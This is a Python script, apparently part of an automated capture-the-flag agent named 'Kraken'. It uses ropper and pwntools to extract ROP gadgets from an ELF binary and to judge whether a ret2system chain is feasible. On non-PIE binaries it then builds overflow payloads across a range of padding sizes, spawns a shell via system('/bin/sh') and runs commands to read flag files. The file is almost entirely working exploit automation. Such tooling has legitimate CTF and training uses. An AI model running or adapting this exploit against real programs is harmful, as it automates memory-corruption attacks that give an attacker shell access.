#!/usr/bin/env python3
"""
ROP Gadget Extraction & Chain Suggestion for Kraken Agent

Usage: python3 auto_rop_extract.py <binary> [--flag-format FORMAT]

Extracts ROP gadgets using ropper, identifies key gadgets for common chains
(ret2system), and attempts automated exploitation on non-PIE binaries.
Outputs EXTRACTED FLAG: <flag> on success.
"""
import argparse
import os
import re
import subprocess
import sys

# Suppress pwntools noise
os.environ.setdefault("PWNLIB_NOTERM", "1")
os.environ.setdefault("PWNLIB_SILENT", "1")

from pwn import ELF, context, process

context.log_level = "error"

FLAG_PATTERN = re.compile(r"[a-zA-Z_]{2,}\{[^}]{3,}\}")
_ANSI_RE = re.compile(r"\x1b\[[0-9;]*m")


def _strip_ansi(text: str) -> str:
    """Remove ANSI color escape sequences from ropper output."""
    return _ANSI_RE.sub("", text)


def _run_ropper(binary_path: str, search: str) -> list[dict]:
    """Run ropper with a search pattern. Returns list of {address, gadget_text}."""
    gadgets = []
    try:
        proc = subprocess.run(
            ["ropper", "--file", binary_path, "--search", search],
            capture_output=True, text=True, timeout=30,
        )
        for line in proc.stdout.splitlines():
            clean = _strip_ansi(line)
            m = re.match(r"\s*(0x[0-9a-fA-F]+):\s*(.+)", clean)
            if m:
                gadgets.append({"address": int(m.group(1), 16), "gadget_text": m.group(2).strip()})
    except subprocess.TimeoutExpired:
        print(f"[-] Ropper timed out searching for: {search}")
    except FileNotFoundError:
        print("[-] ropper not found in PATH")
    except Exception as e:
        print(f"[-] Ropper error: {e}")
    return gadgets


def _find_gadgets(binary_path: str) -> list[dict]:
    """Run ropper to search for useful gadgets (pop, ret, syscall, int 0x80)."""
    return _run_ropper(binary_path, "pop|ret|syscall|int 0x80")


def _find_stack_pivot_gadgets(binary_path: str) -> list[dict]:
    """Search for jmp esp gadgets (useful for stack pivot / shellcode execution)."""
    return _run_ropper(binary_path, "jmp esp")


def _find_pop_rdi(gadgets: list[dict]) -> dict | None:
    """Find a 'pop rdi; ret' gadget (common for x86-64 ret2system)."""
    for g in gadgets:
        text = g["gadget_text"].lower().replace(" ", "")
        if "poprdi;ret" in text:
            return g
    return None


def _find_ret_gadget(gadgets: list[dict]) -> dict | None:
    """Find a plain 'ret' gadget for stack alignment."""
    for g in gadgets:
        text = g["gadget_text"].strip().rstrip(";").strip()
        if text.lower() == "ret":
            return g
    return None


def _suggest_chain(binary_path: str, gadgets: list[dict]) -> dict | None:
    """Check if a ret2system chain is feasible.

    Returns a dict with chain components if all pieces are found, else None.
    Requires: pop rdi; ret | plain ret | system@plt | "/bin/sh" string.
    """
    try:
        elf = ELF(binary_path, checksec=False)
    except Exception as e:
        print(f"[-] pwntools ELF load failed: {e}")
        return None

    pop_rdi = _find_pop_rdi(gadgets)
    ret = _find_ret_gadget(gadgets)

    # Check for system@plt
    system_addr = None
    if "system" in elf.plt:
        system_addr = elf.plt["system"]

    # Search for "/bin/sh" string in the binary
    sh_addr = None
    try:
        sh_addr = next(elf.search(b"/bin/sh"))
    except StopIteration:
        pass

    # Check PIE status
    pie = elf.pie

    chain = {
        "pop_rdi": pop_rdi,
        "ret": ret,
        "system_addr": system_addr,
        "sh_addr": sh_addr,
        "pie": pie,
        "elf": elf,
    }

    if pop_rdi and system_addr and sh_addr:
        print(f"[+] ret2system chain FEASIBLE:")
        print(f"    pop rdi; ret  @ {hex(pop_rdi['address'])}")
        if ret:
            print(f"    ret (align)   @ {hex(ret['address'])}")
        print(f"    system@plt    @ {hex(system_addr)}")
        print(f"    \"/bin/sh\"     @ {hex(sh_addr)}")
        if pie:
            print(f"    [!] Binary has PIE -- addresses will be randomized, skipping exploit")
        return chain

    # Report what's missing
    missing = []
    if not pop_rdi:
        missing.append("pop rdi; ret")
    if not system_addr:
        missing.append("system@plt")
    if not sh_addr:
        missing.append("\"/bin/sh\" string")
    print(f"[-] ret2system chain NOT feasible -- missing: {', '.join(missing)}")
    return chain


def _attempt_exploit(binary_path: str, chain: dict, flag_pattern: re.Pattern) -> str | None:
    """Attempt ret2system exploitation on a non-PIE binary.

    Tries to overflow a buffer, redirect execution to system("/bin/sh"),
    then read output looking for a flag.
    """
    pop_rdi = chain["pop_rdi"]
    ret = chain["ret"]
    system_addr = chain["system_addr"]
    sh_addr = chain["sh_addr"]
    elf = chain["elf"]

    if not (pop_rdi and system_addr and sh_addr):
        return None
    if chain["pie"]:
        return None

    # Try various buffer sizes for overflow
    for buf_size in [32, 40, 48, 64, 72, 80, 96, 128, 256]:
        padding = b"A" * buf_size
        # Build ROP chain: [padding] [ret (align)] [pop rdi; ret] [sh_addr] [system]
        payload = padding
        if ret:
            payload += ret["address"].to_bytes(8, "little")
        payload += pop_rdi["address"].to_bytes(8, "little")
        payload += sh_addr.to_bytes(8, "little")
        payload += system_addr.to_bytes(8, "little")

        try:
            p = process(binary_path, timeout=5)
            p.sendline(payload)
            # If we get a shell, try reading flag files
            try:
                p.sendline(b"cat flag* 2>/dev/null; cat /flag* 2>/dev/null; echo $FLAG 2>/dev/null")
                p.sendline(b"exit")
                output = p.recvall(timeout=3).decode("utf-8", errors="replace")
            except Exception:
                output = ""
                try:
                    output = p.recvall(timeout=2).decode("utf-8", errors="replace")
                except Exception:
                    pass
            p.close()

            m = flag_pattern.search(output)
            if m:
                return m.group(0)
        except Exception:
            try:
                p.close()
            except Exception:
                pass
            continue

    return None


def _print_summary(gadgets: list[dict], pivot_gadgets: list[dict], chain: dict | None):
    """Print a summary of discovered gadgets and chain feasibility."""
    print(f"\n=== ROP Gadget Summary ===")
    print(f"  Total useful gadgets found: {len(gadgets)}")
    print(f"  Stack pivot (jmp esp) gadgets: {len(pivot_gadgets)}")

    if chain:
        print(f"  pop rdi; ret: {'FOUND @ ' + hex(chain['pop_rdi']['address']) if chain['pop_rdi'] else 'NOT FOUND'}")
        ret = chain.get("ret")
        print(f"  ret (align):  {'FOUND @ ' + hex(ret['address']) if ret else 'NOT FOUND'}")
        print(f"  system@plt:   {'FOUND @ ' + hex(chain['system_addr']) if chain['system_addr'] else 'NOT FOUND'}")
        print(f"  /bin/sh str:  {'FOUND @ ' + hex(chain['sh_addr']) if chain['sh_addr'] else 'NOT FOUND'}")
        print(f"  PIE:          {'YES' if chain['pie'] else 'NO'}")

    if gadgets:
        print(f"\n  First 10 gadgets:")
        for g in gadgets[:10]:
            print(f"    {hex(g['address'])}: {g['gadget_text']}")


def main():
    parser = argparse.ArgumentParser(description="Kraken ROP Gadget Extractor & Chain Exploiter")
    parser.add_argument("binary", help="Path to the ELF binary")
    parser.add_argument("--flag-format", default="", help="Flag format regex (default: standard CTF pattern)")
    args = parser.parse_args()

    binary_path = os.path.abspath(args.binary)
    if not os.path.isfile(binary_path):
        print(f"[-] Binary not found: {binary_path}")
        sys.exit(1)

    # Build flag pattern
    if args.flag_format:
        try:
            flag_pattern = re.compile(args.flag_format)
        except re.error:
            print(f"[-] Invalid flag format regex: {args.flag_format}, using default")
            flag_pattern = FLAG_PATTERN
    else:
        flag_pattern = FLAG_PATTERN

    print(f"[*] Analyzing binary: {binary_path}")

    # Step 1: Extract gadgets
    print(f"[*] Searching for ROP gadgets...")
    gadgets = _find_gadgets(binary_path)
    print(f"[+] Found {len(gadgets)} gadgets")

    # Step 2: Search for stack pivot gadgets
    print(f"[*] Searching for stack pivot gadgets (jmp esp)...")
    pivot_gadgets = _find_stack_pivot_gadgets(binary_path)
    if pivot_gadgets:
        print(f"[+] Found {len(pivot_gadgets)} jmp esp gadgets")
    else:
        print(f"[-] No jmp esp gadgets found")

    # Step 3: Check chain feasibility
    print(f"[*] Checking ret2system chain feasibility...")
    chain = _suggest_chain(binary_path, gadgets)

    # Step 4: Attempt exploitation if chain is feasible and no PIE
    flag = None
    if chain and chain.get("pop_rdi") and chain.get("system_addr") and chain.get("sh_addr") and not chain.get("pie"):
        print(f"[*] Attempting ret2system exploitation...")
        flag = _attempt_exploit(binary_path, chain, flag_pattern)
        if flag:
            print(f"[+] Exploitation succeeded!")
        else:
            print(f"[-] Exploitation did not yield a flag (binary may need specific input first)")

    # Print summary
    _print_summary(gadgets, pivot_gadgets, chain)

    if flag:
        print(f"\nEXTRACTED FLAG: {flag}")
    else:
        print(f"\n[-] No flag extracted (chain suggestion printed above for manual use)")


if __name__ == "__main__":
    main()
